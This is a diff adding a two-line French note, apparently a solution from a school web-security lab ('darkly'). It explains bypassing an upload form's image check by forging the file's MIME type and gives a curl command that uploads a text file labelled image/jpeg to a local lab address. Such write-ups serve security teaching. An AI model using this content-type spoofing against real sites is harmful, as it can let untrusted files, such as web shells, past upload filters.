@@ -1,0 +1,2 @@
+Il faut uploader une image, du moins n'importe quel fichier qui ressemble à une image. Pour ce faire on attribut le type image à un fichier et on fait la requete
+curl -F 'Upload=Upload' -F 'MAX_FILE_SIZE=100000' -F 'uploaded=@//Users/lseiberr/42Post/darkly/admin/Resolution/solution.txt;type=image/jpeg' http://192.168.64.17/?page=upload#
